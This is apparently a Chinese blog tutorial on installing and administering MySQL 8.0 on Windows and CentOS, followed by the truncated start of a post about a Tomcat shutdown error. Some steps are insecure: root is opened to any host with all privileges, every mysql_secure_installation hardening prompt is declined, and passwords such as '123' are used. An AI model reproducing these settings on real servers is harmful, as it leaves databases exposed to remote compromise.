MySQL数据库是关系数据库。关系数据库将数据存储在单独的表中，而不是将所有数据放在一个大的仓库中。数据库结构被组织成针对速度进行了优化的物理文件。具有对象（例如数据库，表，视图，行和列）的逻辑模型提供了灵活的编程环境。您可以设置规则来控制不同数据字段之间的关系，例如一对一，一对多，唯一，必需或可选以及不同表之间的“指针”。数据库强制执行这些规则，因此，在设计良好的数据库中，您的应用程序永远不会看到不一致，重复，孤立，孤立，过期或丢失的数据。“ MySQL”的SQL部分代表“ 结构化查询语言 ”。SQL是用于访问数据库的最常见的标准化语言。根据您的编程环境，MySQL的主要功能您可以直接输入SQL（例如，生成报告），将SQL语句嵌入用另一种语言编写的代码中，或者使用特定于语言的API来隐藏SQL语法。SQL由ANSI / ISO SQLStandard定义。SQL标准自1986年以来一直在发展，并且存在多个版本。在本手册中，“ SQL-92”是指1992年发布的标准，“ SQL：1999”是指1999年发布的标准，“ SQL：2003”是指标准的当前版本。我们使用“ SQL标准”这一短语来随时表示SQL标准的当前版本 MySQL软件是开源的。 开源意味着任何人都可以使用和修改该软件。任何人都可以从互联网上下载MySQL软件并使用它而无需支付任何费用。如果愿意，您可以学习源代码并进行更改以适合您的需求。MySQL软件使用http://www.fsf.org/licenses/的GPL（GNU通用公共许可证） 来定义您在不同情况下可以使用或不可以使用的软件。如果您对GPL不满意，或者需要将MySQL代码嵌入到商业应用程序中，可以从我们这里购买商业许可的版本。有关更多信息，请参见“ MySQL许可概述”（http://www.mysql.com/company/legal/licensing/） 数据库排名 MySQL数据库服务器非常快速，可靠，可扩展且易于使用。 如果这是您想要的，请尝试一下。MySQL Server可以与其他应用程序，Web服务器等一起轻松地在台式机或笔记本电脑上运行，几乎不需要或根本不需要注意。如果将整台计算机专用于MySQL，则可以调整设置以利用所有可用的内存，CPU能力和I / O容量。MySQL还可以扩展到一起联网的机器集群。 MySQL Server最初是为处理大型数据库而开发，其处理速度比现有解决方案要快得多，并且已经在苛刻的生产环境中成功使用了数年。尽管经过不断的发展，MySQL Server如今提供了丰富而有用的功能。它的连接性，速度和安全性使MySQLServer非常适合访问Internet上的数据库。 • MySQL Server在客户端/服务器或嵌入式系统中运行。 MySQL数据库软件是一个客户端/服务器系统，由支持不同后端的多线程SQL Server，几个不同的客户端程序和库，管理工具以及广泛的应用程序编程接口（API）组成。 我们还提供MySQL Server作为嵌入式多线程库，您可以将其链接到应用程序中，以获取更小，更快，更易于管理的独立产品。 提供了大量的MySQL贡献软件。 MySQL Server具有与我们的用户密切合作开发的一组实用功能。您最喜欢的应用程序或语言很可能支持MySQL数据库服务器。 发音“ MySQL”的官方方法是“ My Ess Que Ell”（不是“ my sequel”），但是我们不介意将其发音为“ my sequel”还是其他本地化方式。 MySQL的前世今生 2001年MySQL数据库中加入了另一个存储引擎InnoDB。InnoDB支持事务，支持行级锁定，对于高并发的用户来说，可谓及时雨。至此，MySQL中的MyISAM和InnoDB两大主力引擎均已就位，而互联网大潮也早就鼓舞起来，MySQL也开始有了自己的市场。所以在2001年发布的3.23 版本的时候，该版本已经支持大多数的基本的SQL 操作，而且还集成了MyISAM和InnoDB 存储引擎。MySQL与InnoDB的正式结合版本是4.0。 2005年，MySQL5.0版本发布，这是个非常重要的版本，提供了众多特性，比如说：存储过程、触发器、视图、游标、分布式事务等，它也越来越像是一个企业级的数据库，具备了较为全面的技术指标。 正当一切看起来很顺利的时候，InnoDB存储引擎的版权商Innobase被Oracle收购。同年Oracle又收购了Sleepcat公司，该公司为MySQL提供了支持事务的BDB存储引擎。很明显MySQL被Oracle盯上了。 2007年MySQL的年总收入已经达到了7500万美元，照此下去2008年非常有希望达到1个亿的目标。然而，事实难料，SUN公司出价10亿美元，收购MySQL公司，及其拥有的MySQL产品、商标及版本。 后来由于种种原因MySQL创始人：Michael Widenius、Allan Larssion先后向SUN公司提交了辞呈，离开了他们一手创立的企业。 2009年Oracle公司出价74亿美元收购SUN公司，通过收购SUN公司，Oracle终于将MySQL收入囊中 MySQL版本官方版本介绍英文版中文版 要安装哪个MySQL版本和发行版首先，确定是安装开发版本还是通用版本（GA）。开发版本具有最新功能，但不建议用于生产环境。GA 版本，也称为生产版本或稳定版本，旨在用于生产用途。我们建议使用最新的GA版本。MySQL 8.0中的命名方案使用的发行版名称由三个数字和一个可选的后缀组成（例如，mysql-8.0.1-dmr）。发行名称中的数字解释如下：• 第一个数字（8）是主版本号。• 第二个数字（0）是次要版本号。总而言之，主要和次要数字构成发行版本号。序列号描述了稳定的功能集。• 第三个数字（1）是发行系列中的版本号。对于每个新的错误修正版本，此值均递增。在大多数情况下，系列中的最新版本是最佳选择。版本名称也可以包含一个后缀，以指示版本的稳定性。一系列发行中的发布会通过一组后缀来指示稳定性水平如何提高。可能的后缀为：• dmr指示开发里程碑版本（DMR）。MySQL开发使用里程碑模型，其中每个里程碑都引入了一小部分经过全面测试的功能。从一个里程碑到下一个里程碑，基于尝试这些正常发布的社区成员提供的反馈，功能界面可能会更改，甚至功能可能会被删除。里程碑版本中的功能可能被视为具有预生产质量。• rc表示发布候选（RC）。通过MySQL的所有内部测试后，发布候选版本被认为是稳定的。RC版本中可能仍会引入新功能，但是重点将转移到修复错误上，以稳定本系列中较早引入的功能。 缺少后缀表示一般可用性（GA）或生产版本。GA版本稳定，已成功通过了较早的发布阶段，并且被认为是可靠的，没有严重的错误并且适合在生产系统中使用。系列开发工作从DMR版本开始，随后是RC版本，最后达到GA状态版本。 mysql版本及操作系统支持表 1https://www.mysql.com/support/supportedplatforms/database.html 可以发现，mysql5.6和5.7和8.0 都支持linux centos7或centos6的x86_64架构的 但是ARM 64架构的只有mysql8.0才支持。 windows 10 只支持 mysql5.7和mysql8.0 windows server 2012 和server 2016 mysql5.6、5.7 和 8.0都支持 macOS 10.14版本只支持5.7和8.0版本。 在Windows 10 上安装 MySQL 8.0.19重要提示：MySQL 8.0 Server 在Windows 平台上安装需要安装“Microsoft Visual C++ 2015 Redistributable Package” 如果是Debug版本，还需要安装“Visual Studio 2015”, 另外MySQL 8.0 只能运行在 64 位的平台上。 安装方法一：使用安装文件直接安装 1.首先下载安装文件 MySQL Installer 8.0.19 这里分两种文件： 一种是在线安装包：mysql-installer-web-community-8.0.19.0.msi（没有绑定任何应用程序） 一种是离线安装包：mysql-installer-community-8.0.19.0.msi（绑定了相关的应用程序） 安装后文件目录结构： 安装目录：C:\\Program Files\\MySQL Server目录：C:\\Program Files\\MySQL\\MySQL Server 8.0 bin:该目录包含 mysqld server,客户端工具及可执行文件 docs:版本发行信息 etc:示例 include: (C/C++)头文件 lib:库文件 share:存放一些字符集，语言文件等信息 数据目录：C:\\ProgramData\\MySQL\\MySQL Server 8.0 Data:存放日志和数据库文件 my.ini:配置文件 安装方法二：使用压缩包文件安装 安装包下载： 1.通用版下载 mysql-8.0.19-winx64.zip 2.Debug版本 mysql-8.0.19-winx64-debug-test.zip 步骤： 1.解压缩 2.新建my.ini文件,放在 basedir 目录下（即与 bin 目录同级） 12345[mysqld]# set basedir to your installation pathbasedir=D:/MySQLDir# set datadir to the location of your data directorydatadir=D:\\\\MySQLDir\\\\data 3.配置环境变量： 1)新建MySQL_HOME变量，并配置 D:/MySQLDir 2)编辑path系统变量 Path：%MySQL_HOME%\\bin 4.初始化：d:\\MySQLDir\\bin&gt;mysqld –initialize –console 注意默认的初始化密码 如果不指定 –console 初始化的相关信息会保存在这个路径下的err文件中：D:\\MySQLDir\\data\\JeeStudy-PC.err 这里不建议使用：–initialize-insecure ，尤其是在生成环境中，绝对不要使用，因为他不产生随机密码！！！ 通过初始化会产生默认用户root,即 ‘root’@’localhost’ 5.启动：mysqld –console 6.登录：mysql -u root -p 7.修改密码： 123mysql&gt; alter user 'root'@'localhost' identified by '123';mysql&gt; alter user session_user() identified by '123';mysql&gt; alter user user() identified by '123'; 8.安装服务： mysqld –install mysql819 （删除服务：sc delete mysql819 或者：mysqld –remove mysql819） 9.启动服务： net start mysql819 （停止服务：net stop mysql819） 10.测试：查看数据库：mysqlshow.exe -u root -p查看mysql数据库中的表：mysqlshow.exe mysql -u root -p执行一个sql语句：mysql -e “select user,host,plugin from mysql.user” mysql -u root -p 11.登录后，查看数据库 show databases; 12.再次初始化： 1234567mysqld --initialize --console2020-03-27T02:58:20.717236Z 0 [System] [MY-013169] [Server] D:\\MySQLDir\\bin\\mysqld.exe (mysqld 8.0.19) initializing of server in progress as process 74922020-03-27T02:58:20.868250Z 0 [ERROR] [MY-010457] [Server] --initialize specified but the data directory has files in it. Aborting.2020-03-27T02:58:20.868291Z 0 [ERROR] [MY-013236] [Server] The designated data directory D:\\MySQLDir\\data\\ is unusable. You can remove all files that the server added to it.2020-03-27T02:58:20.908326Z 0 [ERROR] [MY-010119] [Server] Aborting2020-03-27T02:58:20.949898Z 0 [System] [MY-010910] [Server] D:\\MySQLDir\\bin\\mysqld.exe: Shutdown complete (mysqld 8.0.19) MySQL Community Server - GPL. 13.创建用户： 1create user 'yichen'@localhost identified by '321'; 14.数据库测试： 1mysql test -u root -p 123 15.查看字符集： 12mysql&gt; show variables like '%character%';mysql&gt; show charset; 16.注意：1）用这种方法安装，要注意防火墙，需要把MySQL相关的端口添加到防火墙允许策略，否则不让连接。 2）修改mysql.user 中的Host,因为默认是localhost，只能本机连接（这也是一种安全策略） Host is not allowed to connect to this MySQL server。 解决方案：UPDATE mysql.user SET Host='%' WHERE User='root'; （这里我们以root为例）如果不重启服务器，还需要执行： flush privileges; 3）Authentication plugin ‘caching_sha2_password’ cannot be loaded: 找不到指定的模块。这是因为MySQL 8中使用的加密策略是 caching_sha2_password ，如果使用不支持这个加密方式的客户端时会报出这个错误。MySQL 8 之前的版本中加密规则是 mysql_native_password，所以想要连接最新版本的MySQL数据库，需要最新版支持 caching_sha2_password 加密方式的客户端（像：MySQL的CE、Navicat150都是支持的） 12345678[mysqld]# set basedir to your installation pathbasedir=D:/MySQLDir# set datadir to the location of your data directorydatadir=D:\\\\MySQLDir\\\\data# 默认使用“mysql_native_password”插件认证 -- 不推荐使用default_authentication_plugin=mysql_native_password #这是旧的加密方式。 在Linux下 MySQL 8.0 下载安装详解安装环境 123456789yum install -y redhat-lsblsb_release -aLSB Version: :core-4.1-amd64:core-4.1-noarch:cxx-4.1-amd64:cxx-4.1-noarch:desktop-4.1-amd64:desktop-4.1-noarch:languages-4.1-amd64:languages-4.1-noarch:printing-4.1-amd64:printing-4.1-noarchDistributor ID: CentOSDescription: CentOS Linux release 7.8.2003 (Core)Release: 7.8.2003Codename: Core 如果遇到这个问题，解决方案如下：问题：centos8 市场 Cannot update read-only repo解决方法：1、dnf install -y centos-release-stream2、dnf update3、重启CentOS 8 安装方法一：在线傻瓜式安装 1dnf install @mysql 选择Y会继续执行。再次输入Y后安装完成。 2.启动服务，并设置开机启动 1systemctl enable --now mysqld 3.验证 mysqld 是否正在运行 1systemctl status mysqld 结果：Active: active (running) since Mon 2020-03-30 19:11:12 CST; 39s ago 到此 安装MySQL 8.0成功！！！ 安装方法二：在线傻瓜式安装1.获取yum地址或rpm包 官方地址： 1https://dev.mysql.com/downloads/repo/yum/ 根据OS版本，选择Download，在新的页面 “**No thanks, just start my download.**”右键选择“复制链接地址”这样就可以把地址复制下来了，当然也可以直接点击，把rpm包下载下来后进行安装（直接进入第3步）。 2.根据第一步获取下载链接后可以在命令行中直接下载： 1wget https://dev.mysql.com/get/mysql80-community-release-el7-3.noarch.rpm 3.安装MySQL的yum源： 1rpm -ivh mysql80-community-release-el7-3.noarch.rpm 4.安装mysql服务： 1yum install mysql-server 5.启动mysql 12systemctl enable mysqld.servicesystemctl start mysqld.service 查看零时密码 123grep password /var/log/mysqld.log2020-07-16T09:23:00.016493Z 6 [Note] [MY-010454] [Server] A temporary password is generated for root@localhost: huuleKe,u3su 安全性 1mysql_secure_installation 运行mysql_secure_installation脚本，该脚本执行一些与安全性相关的操作并设置MySQL root 密码(移除匿名用户、禁用root远程登录、删除test数据库、重新加载权限表) 123456789101112131415161718192021222324252627282930313233Enter password for user root: #输入临时密码The existing password for the user account root has expired. Please set a new password.New password: #输入新密码 密码设置不能太简单，需要包含大小写或特殊符号Re-enter new password: #再次输入新密码The 'validate_password' component is installed on the server.The subsequent steps will run with the existing configurationof the component.Using existing password for root.Estimated strength of the password: 100 Change the password for root ? ((Press y|Y for Yes, any other key for No) : n #这里表示密码已经更改完成，是否需要继续更改。n就是不更改。 y就是继续更改。Remove anonymous users? (Press y|Y for Yes, any other key for No) : n#删除匿名用户 Normally, root should only be allowed to connect from'localhost'. This ensures that someone cannot guess atthe root password from the network.Disallow root login remotely? (Press y|Y for Yes, any other key for No) : n通常，仅应允许root连接'本地主机'。 这确保了某人无法猜测来自网络的根密码。禁止远程root登录? 选择n不禁用。Remove test database and access to it? (Press y|Y for Yes, any other key for No): n是否删除测试库。Reload privilege tables now? (Press y|y让上面的操作生效 密码加密方式：由于CentOS 8中的某些客户端工具和库与caching_sha2_password方法不兼容，因此CentOS 8存储库中包含的MySQL 8.0服务器设置为使用旧的mysql_native_password身份验证插件，该方法在上游MySQL 8.0发行版中设置为默认。对于大多数设置，mysql_native_password方法应该没问题，但是，如果你想将默认身份验证插件更改为caching_sha2_password，这样可以更快并提供更好的安全性，请打开以下配置文件： 1vim /etc/my.cnf.d/mysql-default-authentication-plugin.cnf 将default_authentication_plugin的值更改为caching_sha2_password： 12[mysqld]default_authentication_plugin=caching_sha2_password 关闭并保存文件，然后重新启动MySQL服务器以使更改生效： 1systemctl restart mysqld 方法三：tar包安装（推荐） 如果以前使用操作系统本机软件包管理系统（例如Yum或APT）安装了MySQL，则在使用本机二进制文件安装时可能会遇到问题。确保以前的MySQL安装已完全删除（使用程序包管理系统），并且所有其他文件（例如数据文件的旧版本）也已删除。您还应该检查配置文件（例如/etc/my.cnf 或/etc/mysql目录）并删除它们 MySQL对libaio 库有依赖性。如果未在本地安装此库，则数据目录初始化和随后的服务器启动步骤将失败。如有必要，请使用适当的程序包管理器进行安装 12yum install libaio -y 1.下载tar文件 12https://dev.mysql.com/get/Downloads/MySQL-8.0/mysql-8.0.21-linux-glibc2.12-x86_64.tar.xz 2.通过rz命令上传到指定的文件夹/usr/local（rz如果没有可以安装一下：yum install -y lrzsz） 为什么选择 /usr/local 这个路径安装呢？是因为MySQL默认安装路径是这个，选用这个路径是，使用它的默认属性安装, 3.解压 1tar -xf mysql-8.0.21-linux-glibc2.12-x86_64.tar.xz -C /usr/local/ 4.重命名解压后的文件夹： 1mv /usr/local/mysql-8.0.21-linux-glibc2.12-x86_64 /usr/local/mysql 5.增加用户及用户组 1234groupadd mysqluseradd -r -g mysql -s /bin/false mysql#-s（不允许登录） -g（加入mysql组） 注意：可以用命令查看一下是否存在mysql用户：cat /etc/passwd |grep mysql另外，强烈建议使用：-s /bin/false ，这个可以用来防止该用户登录。 6.建立存放数据库数据的目录 data（名字随便命名） 1mkdir /usr/local/mysql/data 7.把新建立的data目录指定给mysql组及mysql用户。 1chown mysql:mysql /usr/local/mysql/data/ -R 8.改变data权限 1chmod 750 /usr/local/mysql/data/ -R 增加配置文件 1234567891011vim /etc/my.cnf[mysqld]basedir=/usr/local/mysqldatadir=/usr/local/mysql/datapid-file=/usr/local/mysql/data/mysql.pidsocket=/usr/local/mysql/data/mysql.socklog-error=/var/log/mysqld.log[client]socket= /usr/local/mysql/data/mysql.sock 创建myqld.log日志文件 123touch /var/log/mysqld.logchown mysql:mysql /var/log/mysqld.log 9.初始化数据库 1/usr/local/mysql/bin/mysqld --initialize --user=mysql --basedir=/usr/local/mysql --datadir=/usr/local/mysql/data 123grep password /var/log/mysqld.log2020-07-16T11:45:47.844368Z 6 [Note] [MY-010454] [Server] A temporary password is generated for root@localhost: hXKenqkj:78j 注意：初始化后会生成密码 10.启用SSL协议(默认也是启用的) 1/usr/local/mysql/bin/mysql_ssl_rsa_setup SSL介绍SSL（Secure Socket Layer：安全套接字层）利用数据加密、身份验证和消息完整性验证机制，为基于TCP等可靠连接的应用层协议提供安全性保证。SSL协议提供的功能主要有：1、数据传输的机密性：利用对称密钥算法对传输的数据进行加密。 2.、身份验证机制：基于证书利用数字签名方法对服务器和客户端进行身份验证，其中客户端的身份验证是可选的。 3、消息完整性验证：消息传输过程中使用MAC算法来检验消息的完整性。 如果用户的传输不是通过SSL的方式，那么其在网络中数据都是以明文进行传输的，而这给别有用心的人带来了可乘之机。所以，现在很多大型网站都开启了SSL功能。同样地，在我们数据库方面，如果客户端连接服务器获取数据不是使用SSL连接，那么在传输过程中，数据就有可能被窃取。 提示：可以用命令查看当前数据库是否启用了SSL协议 1show variables like 'have_ssl'; 11.守护进程 启动 mysql 服务 1/usr/local/mysql/bin/mysqld_safe --user=mysql &amp; 12.推荐启动（停止）命令 123456cd /usr/local/mysql/在该目录下有一个文件夹：support-files，把该文件夹下的文件 mysql.server 拷贝到 /etc/init.d/ 这目录cp /usr/local/mysql/support-files/mysql.server /etc/init.d/mysqldsystemctl daemon-reload 启动 1234/etc/init.d/mysqld start 说明：查看底层脚本，会发现在启动时调用的是：$bindir/mysqld_safe 停止 1/etc/init.d/mysqld stop 重启 1/etc/init.d/mysqld restart 查看状态 1/etc/init.d/mysqld status 重新加载（强制动态启动） 1234/etc/init.d/mysqld reload 或者/etc/init.d/mysqld force-reload 说明：如果想要更改配置而不需停止并重新启动服务，则使用该命令。在对配置文件作必要的更改后，发出该命令以动态更新服务配置。 或者 1234systemctl restart mysqldsystemctl start mysqldsystemctl status mysqldsystemctl reload mysqld 13.设置环境变量 123456vim /etc/profileexport PATH=$PATH:/usr/local/mysql/bin#执行下source /etc/profile 非常规安装：1.改变数据目录：改变之前先停掉MySQL服务相关进程需要在下面路径中建立my.cnf 文件 /etc/my.cnf添加下面内容： 12[mysqld]datadir=/MySQLDir/dataDir 2.改变MySQL程序目录：需要在上面的文件中添加如下配置： 1basedir=/soft/mysql 还需要修改/etc/init.d/mysqld 文件的数据目录路径 配置用户和密码官方文档 1https://dev.mysql.com/doc/refman/8.0/en/set-password.html 123mysql&gt; alter user user() identified by &quot;123.Shui!!#@&quot;;#user() 函数表示当前登录用户， 注意 帐户更改（包括分配密码）的首选语句 不是使用SET PASSWORD 分配密码，而是使用ALTER USER该语句。例如： 1ALTER USER user() IDENTIFIED BY '123.Shui!!'; 创建可以远程登录的用户： 12345create user 'root'@'%' identified with mysql_native_password by '123.Shui!!#@';grant all privileges on *.* to root@'%' with grant option;flush privileges; 删除权限 1REVOKE all privileges ON *.* FROM 'test1'@'%'; 后期修改密码 1ALTER USER 'root'@'%' IDENTIFIED WITH mysql_native_password BY '123.Shui!!#@'; 忘记密码修改。 1234vim /etc/my.cnf (在[mysqld]参数组下添加)skip-grant-tables #跳过授权表重启mysql 登录 把user变里的authentication_string字段的内容清空。 12345mysql -u root select user,host,authentication_string from mysql.user; #查看表的内容信息update mysql.user set authentication_string='' where user='root' and host='%'; 然后退出 退出，把Skip-grant-table语句删除，重新启动数据库 123456789alter user'root'@'%' IDENTIFIED BY '123.Shui!!#@'; #默认的模式。之前旧模式，修改后就是旧模式，之前是新模式就是新模式。最好就是每次修改自己指定修改密码为mysql_native_password身份验证模式。ALTER USER 'root'@'%' IDENTIFIED WITH mysql_native_password BY '123.Shui!!#@@'; 修改密码为caching_sha2_password身份验证模式。ALTER USER 'root'@'%' IDENTIFIED WITH caching_sha2_password BY '123.Shui!!#@';新的身份验证模式。 再使用新的密码登录 mysql基础语句操作一，mysql基础命令12345678910111213141516171819202122232425262728291、启动服务 说明： 以管理员身份运行cmd 格式： net start 服务名称 示例： net start mysql5 2、停止服务 说明： 以管理员身份运行cmd 格式： net stop 服务名称 示例： net stop mysql5.7 3、连接数据库 格式：mysql -u 用户名 -P 端口号 -p 示例：mysql -u root -P 3308 -p 输入密码(安装时设置的) 4、退出登录(断开连接) quit或exit \\c 决定不想执行正在输入的查询，请输入\\ c取消查询 5、 查看版本(连接后执行) 示例： select version(); 6、 显示当前时间(连接后执行) 示例： select now(); 7、 远程连接 格式： mysql -h ip地址 -u 用户名 -P 端口号 -p 输入对方密码 示例： mysql -h 192.168.224.11 -u root -P 3306 -p 二、数据库操作1234567891011121314151、创建数据库 格式： create database 数据库名 charset=utf8; 示例： create database yichen charset=utf8;2、删除数据库 格式： drop database 数据库名; 示例： drop database yichen;3、切换数据库 格式： use 数据库名 ; 示例： use yichen;4、查看当前选择的数据库 格式： select database(); 示例： select database(); 三、表操作(DDL) 对表操作的命令1234567891011121314151617181920212223242526271、查看当前数据库中所有表 show tables;2、创建表 格式：create table 表名(列及类型); 说明： auto_increment 表明自增长 primary key 主键 not nell 表示不为空 示例：create table student(id int auto_increment primary key,name varchar(20) not null, age int not null, gender bit default 1, address varchar(20),isDelete bit default 0); 3、删除表 格式: drop table 表名; 示例: drop table student;4、 查看表结构 格式：desc 表名; 示例： desc student; 5、查看建表语句 格式：show create table 表名; 示例：show create table student; 6、 重命名表名 格式：rename table 原表名 to 新表名 示例：rename table car to newCar;7、修改表 格式：alter table 表名 add|change|drop 列名 类型; 示例： alter table newcar add isDelete bit default 0; 四、数据操作(DML) 对表内容操作1、增 1234567891011121、全列插入 格式：insert into 表名 values(...) 说明：主键列是自动增长，但是在全列插入时需要站位,通常使用0,插入成功以后以实际数据为准， 示例：insert into student values(0,&quot;tom&quot;,19, 1,&quot;北京&quot;, 0);2、缺省插入 格式：insert into 表名(列1,列2,....) values(值1,值2,....); 示例：insert into student(name,age,address) values (&quot;linei&quot;,19,&quot;上海&quot;);3、同时插入多条数据 格式: insert into 表名 values(.....),(.....),(....); 示例: insert into student values(0,&quot;韩梅梅&quot;,19, 0,&quot;北京&quot;, 0),(0,&quot;poi&quot;,19, 0,&quot;海南&quot;, 0),(0,&quot;liwei&quot;,20, 0,&quot;北京&quot;, 0); 2、 删 123格式: delete from 表名 where 条件;示例: delete from student where id = 4;注意: 没有条件是全部删除，慎用! delete from student; 3、改 12345格式：update 表名 set 列1=值1，列2=值2,...... where 条件 ;示例1：update student set age=16 where id = 7;示例2: update student set age=16,name=&quot;yichen&quot; where id = 8;示列3： update user set host=&quot;%&quot; where user=&quot;root&quot;;注意: 没有条件是全部列都修改，慎用! 数据查询(DQL)123 查询表中的全部数据格式: select * from 表名;示例: select * from student; 1、基本语法 1234567891011格式：select * from 表名: 说明： a、from 关键字后面是表名，表示数据来源于这张表 b、select 后面写表中的列名，如果是* 表示在结果的集中显示表中的所有列 c、在select后面的列名部分，可以使用as为列名起别名，这个别名显示在结果集中 d、 如果要查询多个列，之间使用逗号分隔 示列： select * from student; select name, age from student; select name as a, age from student; 2、消除重复行 1234在select 后面列前面使用distinct可以消除重复的行示列： select gender from student; select distinct gender from student; 3、条件查询 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950511、语法 格式：select * from 表名 where 条件 2、比较运算符 等于 = 大于 &gt; 小于 &lt; 大于等于 &gt;= 小于等于 &lt;= 不等于 != 或&lt;&gt; 需求:查询id值大于8的所有数据 示例: select * from student where id&gt;8; 3、逻辑运算符 and 并且 or 或者 not 非 需求: 查询id值大于7的女同学 示例: select * from student where id&gt;7 and gender=0;4、模糊查询 insert into student values(0,&quot;刘德华&quot;,50, 1,&quot;香港&quot;, 0); insert into student values(0,&quot;刘阳&quot;,52, 1,&quot;北京&quot;, 0); like %表示任意多个字符 _表示一个任意字符 需求：查询姓刘的同学 示例：select * from student where name like &quot;刘%&quot;; select * from student where name like &quot;刘_&quot;;5、范围查询 in 表示在一个非连续的范围内 between ...and.. 表示在一个连续的范围内 需求： 查询编号为8、10、12的学生 示例： select * from student where id in (8,10,12); 需求： 查询编号为6到8的学生 示例： select * from student where id between 6 and 8;6、空判断 insert into student(name,age) values (&quot;特朗普&quot;,72); 注意： null与&quot;&quot;是不同 判断空： is null 判断非空: is not null 需求：查询没有地址的同学 示例: select * from student where address is null; 需求: 查询有地址的同学 示例: select * from student where address is not null;7、优先级 小括号, not 比较运算符, 逻辑运算符 and比or 优先级高，如果同时出现并希望先选or,需要结合()来使用 4、聚合 123456789101112131415161718192021222324为了快速的统计数据，提供了5个聚合函数1、count(*) 表示计算总行数，括号中的可以写*和列名2、max(列) 表示求此列的最大值3、min(列) 表示求此列的最小值4、sum(列) 表示求此列的和5、avg(列) 表示求此列的平均值 需求： 查询学生的总数 示例： select count(*) from student; 或 select count(name) from student; 需求： 查询女生的编号最大值 示例： select max(id) from student where gender =0; 需求： 查询女生的年龄最大值 示例： select max(age) from student where gender =0; 需求： 查询女生的编号最小值 示例： select min(id) from student where gender =0; 需求： 查询所有学生的年龄和 示例： select sum(age) from student; 需求： 查询所有学生的年龄的平均值 示例： select avg(age) from student; 5、分组 12345678910111213141516按照字段分组，表示此字段相同的数据会被放到一个集合中。分组后，只能查询出相同的数据列，对于有差异的数据列无法显示在结果中可以对分组后的数据进行统计，做聚合运算 语法：select 列1,列2,聚合.....from 表名 group by 列1,列2,列3,..... 需求： 查询男女生的总数 示例： select gender,count(*) from student group by gender; select name,gender,count(*) from student group by gender,age; 分组后的数据筛选：select 列1,列2,聚合.....from 表名 group by 列1,列2,列3,..... having 列1,列2,..聚合.... 示例： select gender,count(*) from student group by gender having gender; where与having的区别： where是对from后面指定的表进行筛选，属于对原始数据筛选。 having是对group by 的结果进行筛选。 6、排序 1234567891011121314语法：select * from 表名 order by 列1 asc|desc, 列2 asc|desc, .....;说明： 1、将数据按照列1进行排序，如果某些列1的值相同，则按照列2进行排序， 2、默认按照从小到大的顺序排序 3、asc升序 4、desc降序 需求：按年龄排序示列： select * from student order by age;需求：将没有被删除的数据按年龄降序示例： select * from student where isDelete =0 order by age desc;需求：将数据年龄和id都降序示例： select * from student where isDelete =0 order by age desc,id desc; 7、分页 12345678语法： select * from 表名 limit start ,count; 说明： start索引从0开始。需求： 从0行开始看，每页看3行示例： select * from student limit 0,3;需求： 从3行开始看，每页看3行示例： select * from student limit 3,3;需求： 只看女生，从0行开始，每页看3行示例： select * from student where gender=0 limit 0,3; 五，数据控制语言(DCL) grant 授权官方文档 1https://dev.mysql.com/doc/refman/8.0/en/grant.html 创建用户 文档 1https://dev.mysql.com/doc/refman/8.0/en/create-user.html 帐户名的主机名部分（如果省略）默认为'%'。 1create user 'test1' identified by '123.yichen'; #这种没有指定为旧的密码身份验证，有些客户端连不上。不支持， 123456创建用户，使用mysql_native_password的身份验证插件。 create user 'test2'@'%' identified with mysql_native_password by 'Mysql138#$'; 这样远程可以连接了，但是还没有数据库访问权限，需要授权。 创建用户，使用caching_sha2_password的身份验证插件。#默认也是这种的。 CREATE USER 'test3'@'%' IDENTIFIED WITH caching_sha2_password BY 'Mysql138#$'; 授权(grant) 12345678910所有权限:GRANT ALL ON *.* TO 'test1'@'%'; #这样就可以访问数据库权限了。flush privileges;使副本能够从源读取二进制日志事件，复制，配置主从使用的grant super,replication slave on *.* to 'test1'@'%';flush privileges;查询和插入权限:GRANT SELECT, INSERT ON *.* TO 'test2'@'test2'; 要将GRANT OPTION 特权授予帐户而不更改其特权，请执行以下操作： 1GRANT USAGE ON *.* TO 'someuser'@'somehost' WITH GRANT OPTION; 请谨慎对待授予谁GRANT OPTION特权，因为具有不同特权的两个用户可能可以组合特权！ 您不能授予其他用户您自己没有的特权；该GRANT OPTION 特权使您只能分配自己拥有的那些特权。 请注意，当您向用户授予 GRANT OPTION特定特权级别的特权时，该用户在该级别拥有（或将来可能会授予）的任何特权也可以由该用户授予其他用户。假设您授予用户INSERT对数据库的特权。然后，如果您授予 SELECT数据库特权并指定WITH GRANT OPTION，则该用户不仅可以将SELECT特权授予其他用户，还可以将特权 授予其他用户 INSERT。如果你再授予 UPDATE权限的数据库用户，用户可以授予 INSERT， SELECT和 UPDATE。 对于非管理用户，不应在ALTER全局或mysql系统架构上授予 特权。如果这样做，用户可以尝试通过重命名表来破坏特权系统！ 权限回收(revoke) 123456回收插入权限:REVOKE INSERT ON *.* FROM 'test1'@'%';回收world库下面的查询权限REVOKE SELECT ON world.* FROM 'test1'; 六、关联1234567891011121314151617181920212223建表语句：1、create table class(id int auto_increment primary key, name varchar(20) not null,stuNum int not null );2、create table students(id int auto_increment primary key ,name varchar(20) not null, gender bit default 1, classid int not null,foreign key(classid)references class(id));插入一些数据：insert into class values(0,&quot;python01&quot;,55),(0,&quot;python02&quot;,50),(0,&quot;python03&quot;,60),(0,&quot;python04&quot;,80);insert into students values(0,&quot;tom&quot;,1,1);insert into students values(0,&quot;lilei&quot;,1,10);insert into students values(0,&quot;jack&quot;,1,2);关联查询：select students.name,class.name from class inner join students on class.id=students.classid;select students.name,class.name from class left join students on class.id=students.classid;分类：1、表 inner join 表B 表A与表B匹配的行会出现在结果集中2、表A left join 表B; 表A与表B匹配的行会出现在结果集中，外加表A中独有的数据，未对应的数据使用null填充3、表A right join 表B 表A与表B匹配的行会出现在结果集中，外加表A中独有的数据，未对应的数据使用null填充 select students.name,class.name from class right join students on class.id=students.classid;","link":"/2020/08/03/mysql%E5%9F%BA%E7%A1%80/"},{"title":"tomcat无法关闭的问题","text":"tomcat无法关闭的问题 shutdown.sh 报这样的错误 1234567891011121314151617181920java.net.ConnectException: 连接超时 at java.net.PlainSocketImpl.socketConnect(Native Method) at java.net.AbstractPlainSocketImpl.doConnect(AbstractPlainSocketImpl.java:345) at java.net.AbstractPlainSocketImpl.connectToAddress(AbstractPlainSocketImpl.java:206) at java.net.AbstractPlainSocketImpl.connect(AbstractPlainSocketImpl.java:188) at java.net.SocksSocketImpl.connect(SocksSocketImpl.java:392) at java.net.Socket.connect(Socket.java:589) at java.net.Socket.connect(Socket.java:538) at java.net.Socket.&lt;init&gt;(Socket.java:434) at java.net.Socket.&lt;init&gt;(Socket.java:211) at org.apache.catalina.startup.Catalina.stopServer(Catalina.java:450) at 